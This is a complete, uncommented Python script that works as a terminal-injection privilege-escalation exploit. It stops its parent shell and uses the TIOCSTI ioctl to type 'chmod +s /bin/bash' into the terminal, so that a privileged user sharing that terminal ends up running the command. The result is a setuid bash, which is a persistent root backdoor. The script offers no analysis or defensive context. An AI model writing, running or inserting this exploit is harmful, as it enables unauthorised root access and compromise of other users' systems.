#!/usr/bin/env python3
import os, signal, fcntl, termios

os.kill(os.getppid(), signal.SIGSTOP)
for char in 'chmod +s /bin/bash\n':
    fcntl.ioctl(0, termios.TIOCSTI, char)
